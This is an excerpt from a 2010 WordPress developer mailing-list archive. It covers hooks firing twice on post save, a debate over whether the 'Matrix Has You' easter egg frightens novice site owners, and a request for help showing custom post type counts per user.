From johnbillion+wp at gmail.com  Sat Oct 23 03:41:40 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Sat, 23 Oct 2010 04:41:40 +0100
Subject: [wp-hackers] save_post action done twice
In-Reply-To: <AANLkTinssV1JUrPH0u+PqtFzaE8rZ_SE-t2WS5HTD1bt@mail.gmail.com>
References: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
	<AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>
	<AANLkTin0WcAo=osf-Fi9Na_pmwgcWwV8c8dDS2Dz9qx4@mail.gmail.com>
	<AANLkTinssV1JUrPH0u+PqtFzaE8rZ_SE-t2WS5HTD1bt@mail.gmail.com>
Message-ID: <AANLkTikoP17BXLKx_-KyYOkK-dfKmNE98mvJJCyueb5S@mail.gmail.com>

Two handy functions for this scenario:

wp_is_post_revision( $post_id ) and wp_is_post_autosave( $post_id ).

John

On Fri, Oct 22, 2010 at 1:16 PM, scribu <mail at scribu.net> wrote:
> On Fri, Oct 22, 2010 at 1:52 PM, Scott Bressler <sbressler at gmail.com> wrote:
>
>> Is save_post better than edit_post? What cases would edit_post miss?
>>
>
> From the docblock of wp_insert_post():
>
> ?* @uses do_action() Calls 'edit_post' action on post ID and post data if
> this is an update.
> ?* @uses do_action() Calls 'save_post' and 'wp_insert_post' on post id and
> post data just before returning.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Sat Oct 23 14:51:20 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 23 Oct 2010 10:51:20 -0400
Subject: [wp-hackers] save_post action done twice
In-Reply-To: <AANLkTikoP17BXLKx_-KyYOkK-dfKmNE98mvJJCyueb5S@mail.gmail.com>
References: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
	<AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>
	<AANLkTin0WcAo=osf-Fi9Na_pmwgcWwV8c8dDS2Dz9qx4@mail.gmail.com>
	<AANLkTinssV1JUrPH0u+PqtFzaE8rZ_SE-t2WS5HTD1bt@mail.gmail.com>
	<AANLkTikoP17BXLKx_-KyYOkK-dfKmNE98mvJJCyueb5S@mail.gmail.com>
Message-ID: <AANLkTik+dQDM6S+TtSWZ_YUmcFm9DxoTndT82015N3Cv@mail.gmail.com>

On Fri, Oct 22, 2010 at 11:41 PM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> Two handy functions for this scenario:
>
> wp_is_post_revision( $post_id ) and wp_is_post_autosave( $post_id ).


I think save_post also gets triggered when we create an auto-draft while
loading up post-new.php.

From chris at clwill.com  Sat Oct 23 16:43:33 2010
From: chris at clwill.com (Chris Williams)
Date: Sat, 23 Oct 2010 12:43:33 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>
Message-ID: <C8E85EC5.14B0F%chris@clwill.com>

Thanks to the incredible evangelism of WP a relatively new and inexperienced web master sets up a WP blog.  It has the "famous 5-minute install".  Couldn't be easier.

Then as we saw with the OP, he or one of his users stumbles upon a rather frightening easter egg, and he/they become alarmed that they've been hacked.  WP's reputation as a reliable and easy platform is sullied as they spend time searching the internet to find a resolution.  Only to find that it was "a joke", installed as part of the program from the original bona fide sources.

Your solution is to suggest they write javascript to disable this?  Really?  How was this person to know about this risk in the first place?  How many more potentially scary and alarming easter eggs do you expect them to magically know about and prevent?  What level of Computer Science expertise is required to manage a WP install, beyond the "5-minute install"?  And isn't your solution like locking the barn door after the horse is gone?

________________________________
From: Ryan Bilesky <rbilesky at gmail.com>
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

If you don't like the easter egg use javascript to prevent both radio
buttons for any given revision from being selected at the same time.
Problem solved.



From vid at zippykid.com  Sat Oct 23 17:18:30 2010
From: vid at zippykid.com (Vid Luther)
Date: Sat, 23 Oct 2010 13:18:30 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E85EC5.14B0F%chris@clwill.com>
References: <C8E85EC5.14B0F%chris@clwill.com>
Message-ID: <8586410596422950376@unknownmsgid>

+1

Sent from my iPhone

On Oct 23, 2010, at 12:43 PM, Chris Williams <chris at clwill.com> wrote:

> Thanks to the incredible evangelism of WP a relatively new and inexperienced web master sets up a WP blog.  It has the "famous 5-minute install".  Couldn't be easier.
>
> Then as we saw with the OP, he or one of his users stumbles upon a rather frightening easter egg, and he/they become alarmed that they've been hacked.  WP's reputation as a reliable and easy platform is sullied as they spend time searching the internet to find a resolution.  Only to find that it was "a joke", installed as part of the program from the original bona fide sources.
>
> Your solution is to suggest they write javascript to disable this?  Really?  How was this person to know about this risk in the first place?  How many more potentially scary and alarming easter eggs do you expect them to magically know about and prevent?  What level of Computer Science expertise is required to manage a WP install, beyond the "5-minute install"?  And isn't your solution like locking the barn door after the horse is gone?
>
> ________________________________
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> If you don't like the easter egg use javascript to prevent both radio
> buttons for any given revision from being selected at the same time.
> Problem solved.
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From rbilesky at gmail.com  Sat Oct 23 19:43:52 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sat, 23 Oct 2010 12:43:52 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <C8E85EC5.14B0F%chris@clwill.com>
References: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>
	<C8E85EC5.14B0F%chris@clwill.com>
Message-ID: <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>

calling it a "frightening easter egg" is a bit overkill, i mean its just
plain overkill.  The point of the idea is this, if you manage WP installs
for someone, you can add the javascript so they won't ever see it.  IMO
anyone who is able to install and manage WP by there own should have no
problem with that, it would only cause a problem maybe for some horribly
non-technical person, like my parents.  In which case there is probably
someone with some technical ability who runs the site handles upgrades, ect.

Plus the javascript can be added in via a plugin so really if someone writes
the plugin its a simple as installing a plugin.

On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com> wrote:

> Thanks to the incredible evangelism of WP a relatively new and
> inexperienced web master sets up a WP blog.  It has the "famous 5-minute
> install".  Couldn't be easier.
>
> Then as we saw with the OP, he or one of his users stumbles upon a rather
> frightening easter egg, and he/they become alarmed that they've been hacked.
>  WP's reputation as a reliable and easy platform is sullied as they spend
> time searching the internet to find a resolution.  Only to find that it was
> "a joke", installed as part of the program from the original bona fide
> sources.
>
> Your solution is to suggest they write javascript to disable this?  Really?
>  How was this person to know about this risk in the first place?  How many
> more potentially scary and alarming easter eggs do you expect them to
> magically know about and prevent?  What level of Computer Science expertise
> is required to manage a WP install, beyond the "5-minute install"?  And
> isn't your solution like locking the barn door after the horse is gone?
>
> ________________________________
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> If you don't like the easter egg use javascript to prevent both radio
> buttons for any given revision from being selected at the same time.
> Problem solved.
>
>
>  _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From hempsworth at gmail.com  Sat Oct 23 19:48:41 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Sat, 23 Oct 2010 21:48:41 +0200
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
References: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>
	<C8E85EC5.14B0F%chris@clwill.com>
	<AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
Message-ID: <AANLkTins4+oXj=vX+gW-KeQ8pvxniB2_jYHCUN3neB5W@mail.gmail.com>

Many people use control panels with their hosts that give one-click
installs. It's also present on wordpress.com.

-- Alex


On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> calling it a "frightening easter egg" is a bit overkill, i mean its just
> plain overkill.  The point of the idea is this, if you manage WP installs
> for someone, you can add the javascript so they won't ever see it.  IMO
> anyone who is able to install and manage WP by there own should have no
> problem with that, it would only cause a problem maybe for some horribly
> non-technical person, like my parents.  In which case there is probably
> someone with some technical ability who runs the site handles upgrades,
> ect.
>
> Plus the javascript can be added in via a plugin so really if someone
> writes
> the plugin its a simple as installing a plugin.
>
> On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com> wrote:
>
> > Thanks to the incredible evangelism of WP a relatively new and
> > inexperienced web master sets up a WP blog.  It has the "famous 5-minute
> > install".  Couldn't be easier.
> >
> > Then as we saw with the OP, he or one of his users stumbles upon a rather
> > frightening easter egg, and he/they become alarmed that they've been
> hacked.
> >  WP's reputation as a reliable and easy platform is sullied as they spend
> > time searching the internet to find a resolution.  Only to find that it
> was
> > "a joke", installed as part of the program from the original bona fide
> > sources.
> >
> > Your solution is to suggest they write javascript to disable this?
>  Really?
> >  How was this person to know about this risk in the first place?  How
> many
> > more potentially scary and alarming easter eggs do you expect them to
> > magically know about and prevent?  What level of Computer Science
> expertise
> > is required to manage a WP install, beyond the "5-minute install"?  And
> > isn't your solution like locking the barn door after the horse is gone?
> >
> > ________________________________
> > From: Ryan Bilesky <rbilesky at gmail.com>
> > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >
> > If you don't like the easter egg use javascript to prevent both radio
> > buttons for any given revision from being selected at the same time.
> > Problem solved.
> >
> >
> >  _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Sat Oct 23 21:29:37 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sat, 23 Oct 2010 14:29:37 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTins4+oXj=vX+gW-KeQ8pvxniB2_jYHCUN3neB5W@mail.gmail.com>
References: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>
	<C8E85EC5.14B0F%chris@clwill.com>
	<AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
	<AANLkTins4+oXj=vX+gW-KeQ8pvxniB2_jYHCUN3neB5W@mail.gmail.com>
Message-ID: <AANLkTinnocvq3dU2SznLqU=aLC4k2R=GYBDVRJ8gfshP@mail.gmail.com>

I wold imagine it is a small group of people who would be confused or even
scared by it, and those people probably aren't those who host their own
website, they are the people who would hire a developer to setup their
website.  Now, this is just an assumption but regardless i find the easter
egg quite amusing and have trigger it on purpose even, and anything short of
removing it or having it off by default would have the same affect my
javascript suggestion would, an effect which I don't believe is much if
any.  And I don't foresee it going away.

On Sat, Oct 23, 2010 at 12:48 PM, Alex Hempton-Smith
<hempsworth at gmail.com>wrote:

> Many people use control panels with their hosts that give one-click
> installs. It's also present on wordpress.com.
>
> -- Alex
>
>
> On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > calling it a "frightening easter egg" is a bit overkill, i mean its just
> > plain overkill.  The point of the idea is this, if you manage WP installs
> > for someone, you can add the javascript so they won't ever see it.  IMO
> > anyone who is able to install and manage WP by there own should have no
> > problem with that, it would only cause a problem maybe for some horribly
> > non-technical person, like my parents.  In which case there is probably
> > someone with some technical ability who runs the site handles upgrades,
> > ect.
> >
> > Plus the javascript can be added in via a plugin so really if someone
> > writes
> > the plugin its a simple as installing a plugin.
> >
> > On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com>
> wrote:
> >
> > > Thanks to the incredible evangelism of WP a relatively new and
> > > inexperienced web master sets up a WP blog.  It has the "famous
> 5-minute
> > > install".  Couldn't be easier.
> > >
> > > Then as we saw with the OP, he or one of his users stumbles upon a
> rather
> > > frightening easter egg, and he/they become alarmed that they've been
> > hacked.
> > >  WP's reputation as a reliable and easy platform is sullied as they
> spend
> > > time searching the internet to find a resolution.  Only to find that it
> > was
> > > "a joke", installed as part of the program from the original bona fide
> > > sources.
> > >
> > > Your solution is to suggest they write javascript to disable this?
> >  Really?
> > >  How was this person to know about this risk in the first place?  How
> > many
> > > more potentially scary and alarming easter eggs do you expect them to
> > > magically know about and prevent?  What level of Computer Science
> > expertise
> > > is required to manage a WP install, beyond the "5-minute install"?  And
> > > isn't your solution like locking the barn door after the horse is gone?
> > >
> > > ________________________________
> > > From: Ryan Bilesky <rbilesky at gmail.com>
> > > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> > >
> > > If you don't like the easter egg use javascript to prevent both radio
> > > buttons for any given revision from being selected at the same time.
> > > Problem solved.
> > >
> > >
> > >  _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sun Oct 24 00:51:20 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 23 Oct 2010 20:51:20 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinnocvq3dU2SznLqU=aLC4k2R=GYBDVRJ8gfshP@mail.gmail.com>
References: <AANLkTimZfj+FrJG=jsNxNKi+oEBoH6n2EMUPx5egfkSN@mail.gmail.com>
	<C8E85EC5.14B0F%chris@clwill.com>
	<AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr@mail.gmail.com>
	<AANLkTins4+oXj=vX+gW-KeQ8pvxniB2_jYHCUN3neB5W@mail.gmail.com>
	<AANLkTinnocvq3dU2SznLqU=aLC4k2R=GYBDVRJ8gfshP@mail.gmail.com>
Message-ID: <E084564A-308E-4906-AB5C-313979412BB2@newclarity.net>

I'm thinking this thread does a good job of illustrating the "Curse of Knowledge":

   http://www.nytimes.com/2007/12/30/business/30know.html

(link via Joel Spolsky)

-Mike

On Oct 23, 2010, at 5:29 PM, Ryan Bilesky wrote:

> I wold imagine it is a small group of people who would be confused or even
> scared by it, and those people probably aren't those who host their own
> website, they are the people who would hire a developer to setup their
> website.  Now, this is just an assumption but regardless i find the easter
> egg quite amusing and have trigger it on purpose even, and anything short of
> removing it or having it off by default would have the same affect my
> javascript suggestion would, an effect which I don't believe is much if
> any.  And I don't foresee it going away.
> 
> On Sat, Oct 23, 2010 at 12:48 PM, Alex Hempton-Smith
> <hempsworth at gmail.com>wrote:
> 
>> Many people use control panels with their hosts that give one-click
>> installs. It's also present on wordpress.com.
>> 
>> -- Alex
>> 
>> 
>> On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>> 
>>> calling it a "frightening easter egg" is a bit overkill, i mean its just
>>> plain overkill.  The point of the idea is this, if you manage WP installs
>>> for someone, you can add the javascript so they won't ever see it.  IMO
>>> anyone who is able to install and manage WP by there own should have no
>>> problem with that, it would only cause a problem maybe for some horribly
>>> non-technical person, like my parents.  In which case there is probably
>>> someone with some technical ability who runs the site handles upgrades,
>>> ect.
>>> 
>>> Plus the javascript can be added in via a plugin so really if someone
>>> writes
>>> the plugin its a simple as installing a plugin.
>>> 
>>> On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com>
>> wrote:
>>> 
>>>> Thanks to the incredible evangelism of WP a relatively new and
>>>> inexperienced web master sets up a WP blog.  It has the "famous
>> 5-minute
>>>> install".  Couldn't be easier.
>>>> 
>>>> Then as we saw with the OP, he or one of his users stumbles upon a
>> rather
>>>> frightening easter egg, and he/they become alarmed that they've been
>>> hacked.
>>>> WP's reputation as a reliable and easy platform is sullied as they
>> spend
>>>> time searching the internet to find a resolution.  Only to find that it
>>> was
>>>> "a joke", installed as part of the program from the original bona fide
>>>> sources.
>>>> 
>>>> Your solution is to suggest they write javascript to disable this?
>>> Really?
>>>> How was this person to know about this risk in the first place?  How
>>> many
>>>> more potentially scary and alarming easter eggs do you expect them to
>>>> magically know about and prevent?  What level of Computer Science
>>> expertise
>>>> is required to manage a WP install, beyond the "5-minute install"?  And
>>>> isn't your solution like locking the barn door after the horse is gone?
>>>> 
>>>> ________________________________
>>>> From: Ryan Bilesky <rbilesky at gmail.com>
>>>> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>>>> 
>>>> If you don't like the easter egg use javascript to prevent both radio
>>>> buttons for any given revision from being selected at the same time.
>>>> Problem solved.
>>>> 
>>>> 
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From jaredwilli at gmail.com  Sun Oct 24 04:25:14 2010
From: jaredwilli at gmail.com (Jared Williams)
Date: Sun, 24 Oct 2010 00:25:14 -0400
Subject: [wp-hackers]  Showing users post counts for custom post types
Message-ID: <AANLkTi=r77_ZMN4hvN9nY62b4rjoThbD1EbgH8tJnb6Y@mail.gmail.com>

Hi,

I'm trying to figure out how to hook into the users.php manage page to
create custom columns for showing the number of posts users have for my
custom post types. I created a trac
ticket<http://core.trac.wordpress.org/ticket/15200>for this, but
@nacin explained why it's a job more for a plugin to do
instead, so I turned here.

I have been unable to find a way to manipulate the output of the users
table, so I can add custom columns for CPTs post counts for each user. And
that may have something to do with the question @nacin asked, what would the
post count numbers link to. For the current 'post' post count a user has, it
links to the post manage page, showing all posts for that user
(edit.php?author=ID#).

If I were to link it somewhere, it would be to
'edit.php?post_type=TYPE&author=ID' if that were even somehow possible I
guess. But I don't even necessarily need to link it to anywhere. I mostly
want to just show CPT post counts for each person, having 600 users and a
combined total of 300+ posts across 4 custom post types. Admins are only one
who can submit 'post' posts, so that column in the users page is useless.

Anyone have any tips on hooking into that to do this?

Thanks,
Jared


On Sat, Oct 23, 2010 at 8:51 PM, <wp-hackers-request at lists.automattic.com>wrote:

> Send wp-hackers mailing list submissions to
>        wp-hackers at lists.automattic.com
>
> To subscribe or unsubscribe via the World Wide Web, visit
>        http://lists.automattic.com/mailman/listinfo/wp-hackers
> or, via email, send a message with subject or body 'help' to
>        wp-hackers-request at lists.automattic.com
>
> You can reach the person managing the list at
>        wp-hackers-owner at lists.automattic.com
>
> When replying, please edit your Subject line so it is more specific
> than "Re: Contents of wp-hackers digest..."
>
>
> Today's Topics:
>
>   1. Re: save_post action done twice (Andrew Nacin)
>   2. Re: "The Matrix Has You" easter egg (Chris Williams)
>   3. Re: "The Matrix Has You" easter egg (Vid Luther)
>   4. Re: "The Matrix Has You" easter egg (Ryan Bilesky)
>   5. Re: "The Matrix Has You" easter egg (Alex Hempton-Smith)
>   6. Re: "The Matrix Has You" easter egg (Ryan Bilesky)
>   7. Re: "The Matrix Has You" easter egg (Mike Schinkel)
>
>
> ----------------------------------------------------------------------
>
> Message: 1
> Date: Sat, 23 Oct 2010 10:51:20 -0400
> From: Andrew Nacin <wp at andrewnacin.com>
> Subject: Re: [wp-hackers] save_post action done twice
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTik+dQDM6S+TtSWZ_YUmcFm9DxoTndT82015N3Cv at mail.gmail.com<AANLkTik%2BdQDM6S%2BTtSWZ_YUmcFm9DxoTndT82015N3Cv at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> On Fri, Oct 22, 2010 at 11:41 PM, John Blackbourn
> <johnbillion+wp at gmail.com <johnbillion%2Bwp at gmail.com><
> johnbillion%2Bwp at gmail.com <johnbillion%252Bwp at gmail.com>>
> > wrote:
>
> > Two handy functions for this scenario:
> >
> > wp_is_post_revision( $post_id ) and wp_is_post_autosave( $post_id ).
>
>
> I think save_post also gets triggered when we create an auto-draft while
> loading up post-new.php.
>
>
> ------------------------------
>
> Message: 2
> Date: Sat, 23 Oct 2010 12:43:33 -0400
> From: Chris Williams <chris at clwill.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: "wp-hackers at lists.automattic.com"
>        <wp-hackers at lists.automattic.com>
> Message-ID: <C8E85EC5.14B0F%chris at clwill.com<C8E85EC5.14B0F%25chris at clwill.com>
> >
> Content-Type: text/plain; charset="iso-8859-1"
>
> Thanks to the incredible evangelism of WP a relatively new and
> inexperienced web master sets up a WP blog.  It has the "famous 5-minute
> install".  Couldn't be easier.
>
> Then as we saw with the OP, he or one of his users stumbles upon a rather
> frightening easter egg, and he/they become alarmed that they've been hacked.
>  WP's reputation as a reliable and easy platform is sullied as they spend
> time searching the internet to find a resolution.  Only to find that it was
> "a joke", installed as part of the program from the original bona fide
> sources.
>
> Your solution is to suggest they write javascript to disable this?  Really?
>  How was this person to know about this risk in the first place?  How many
> more potentially scary and alarming easter eggs do you expect them to
> magically know about and prevent?  What level of Computer Science expertise
> is required to manage a WP install, beyond the "5-minute install"?  And
> isn't your solution like locking the barn door after the horse is gone?
>
> ________________________________
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> If you don't like the easter egg use javascript to prevent both radio
> buttons for any given revision from being selected at the same time.
> Problem solved.
>
>
>
>
> ------------------------------
>
> Message: 3
> Date: Sat, 23 Oct 2010 13:18:30 -0400
> From: Vid Luther <vid at zippykid.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: "wp-hackers at lists.automattic.com"
>        <wp-hackers at lists.automattic.com>
> Message-ID: <8586410596422950376 at unknownmsgid>
> Content-Type: text/plain; charset=UTF-8
>
> +1
>
> Sent from my iPhone
>
> On Oct 23, 2010, at 12:43 PM, Chris Williams <chris at clwill.com> wrote:
>
> > Thanks to the incredible evangelism of WP a relatively new and
> inexperienced web master sets up a WP blog.  It has the "famous 5-minute
> install".  Couldn't be easier.
> >
> > Then as we saw with the OP, he or one of his users stumbles upon a rather
> frightening easter egg, and he/they become alarmed that they've been hacked.
>  WP's reputation as a reliable and easy platform is sullied as they spend
> time searching the internet to find a resolution.  Only to find that it was
> "a joke", installed as part of the program from the original bona fide
> sources.
> >
> > Your solution is to suggest they write javascript to disable this?
>  Really?  How was this person to know about this risk in the first place?
>  How many more potentially scary and alarming easter eggs do you expect them
> to magically know about and prevent?  What level of Computer Science
> expertise is required to manage a WP install, beyond the "5-minute install"?
>  And isn't your solution like locking the barn door after the horse is gone?
> >
> > ________________________________
> > From: Ryan Bilesky <rbilesky at gmail.com>
> > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >
> > If you don't like the easter egg use javascript to prevent both radio
> > buttons for any given revision from being selected at the same time.
> > Problem solved.
> >
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> ------------------------------
>
> Message: 4
> Date: Sat, 23 Oct 2010 12:43:52 -0700
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTi=YNF3MJhE+QCHVqtqJSh0MTzRhdV9ginfszvEr at mail.gmail.com<YNF3MJhE%2BQCHVqtqJSh0MTzRhdV9ginfszvEr at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> calling it a "frightening easter egg" is a bit overkill, i mean its just
> plain overkill.  The point of the idea is this, if you manage WP installs
> for someone, you can add the javascript so they won't ever see it.  IMO
> anyone who is able to install and manage WP by there own should have no
> problem with that, it would only cause a problem maybe for some horribly
> non-technical person, like my parents.  In which case there is probably
> someone with some technical ability who runs the site handles upgrades,
> ect.
>
> Plus the javascript can be added in via a plugin so really if someone
> writes
> the plugin its a simple as installing a plugin.
>
> On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com> wrote:
>
> > Thanks to the incredible evangelism of WP a relatively new and
> > inexperienced web master sets up a WP blog.  It has the "famous 5-minute
> > install".  Couldn't be easier.
> >
> > Then as we saw with the OP, he or one of his users stumbles upon a rather
> > frightening easter egg, and he/they become alarmed that they've been
> hacked.
> >  WP's reputation as a reliable and easy platform is sullied as they spend
> > time searching the internet to find a resolution.  Only to find that it
> was
> > "a joke", installed as part of the program from the original bona fide
> > sources.
> >
> > Your solution is to suggest they write javascript to disable this?
>  Really?
> >  How was this person to know about this risk in the first place?  How
> many
> > more potentially scary and alarming easter eggs do you expect them to
> > magically know about and prevent?  What level of Computer Science
> expertise
> > is required to manage a WP install, beyond the "5-minute install"?  And
> > isn't your solution like locking the barn door after the horse is gone?
> >
> > ________________________________
> > From: Ryan Bilesky <rbilesky at gmail.com>
> > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> >
> > If you don't like the easter egg use javascript to prevent both radio
> > buttons for any given revision from being selected at the same time.
> > Problem solved.
> >
> >
> >  _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 5
> Date: Sat, 23 Oct 2010 21:48:41 +0200
> From: Alex Hempton-Smith <hempsworth at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTins4+oXj=vX+gW-KeQ8pvxniB2_jYHCUN3neB5W at mail.gmail.com<vX%2BgW-KeQ8pvxniB2_jYHCUN3neB5W at mail.gmail.com>
> >
> Content-Type: text/plain; charset=ISO-8859-1
>
> Many people use control panels with their hosts that give one-click
> installs. It's also present on wordpress.com.
>
> -- Alex
>
>
> On Sat, Oct 23, 2010 at 9:43 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>
> > calling it a "frightening easter egg" is a bit overkill, i mean its just
> > plain overkill.  The point of the idea is this, if you manage WP installs
> > for someone, you can add the javascript so they won't ever see it.  IMO
> > anyone who is able to install and manage WP by there own should have no
> > problem with that, it would only cause a problem maybe for some horribly
> > non-technical person, like my parents.  In which case there is probably
> > someone with some technical ability who runs the site handles upgrades,
> > ect.
> >
> > Plus the javascript can be added in via a plugin so really if someone
> > writes
> > the plugin its a simple as installing a plugin.
> >
> > On Sat, Oct 23, 2010 at 9:43 AM, Chris Williams <chris at clwill.com>
> wrote:
> >
> > > Thanks to the incredible evangelism of WP a relatively new and
> > > inexperienced web master sets up a WP blog.  It has the "famous
> 5-minute
> > > install".  Couldn't be easier.
> > >
> > > Then as we saw with the OP, he or one of his users stumbles upon a
> rather
> > > frightening easter egg, and he/they become alarmed that they've been
> > hacked.
> > >  WP's reputation as a reliable and easy platform is sullied as they
> spend
> > > time searching the internet to find a resolution.  Only to find that it
> > was
> > > "a joke", installed as part of the program from the original bona fide
> > > sources.
> > >
> > > Your solution is to suggest they write javascript to disable this?
> >  Really?
> > >  How was this person to know about this risk in the first place?  How
> > many
> > > more potentially scary and alarming easter eggs do you expect them to
> > > magically know about and prevent?  What level of Computer Science
> > expertise
> > > is required to manage a WP install, beyond the "5-minute install"?  And
> > > isn't your solution like locking the barn door after the horse is gone?
> > >
> > > ________________________________
> > > From: Ryan Bilesky <rbilesky at gmail.com>
> > > Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> > >
> > > If you don't like the easter egg use javascript to prevent both radio
> > > buttons for any given revision from being selected at the same time.
> > > Problem solved.
> > >
> > >
> > >  _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> ------------------------------
>
> Message: 6
> Date: Sat, 23 Oct 2010 14:29:37 -0700
> From: Ryan Bilesky <rbilesky at gmail.com>
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
> To: wp-hackers at lists.automattic.com
> Message-ID:
>        <AANLkTinnocvq3dU2SznLqU=aLC4k2R=GYBDVRJ8gfshP at mail.gmail.com>
> Content-Type: text/plain; charset=ISO-8859-1
>
> I wold imagine it is a small group of people who would be confused or even
> scared by it, and those people probably aren't those who host their own
> website, they are the people who would hire a developer to setup their
> website.  Now, this is just an assumption but regardless i find the easter
> egg quite amusing and have trigger it on purpose even, and anything short
> of
> removing it or having it off by default would have the same affect my
> javascript suggestion would, an effect which I don't believe is much if
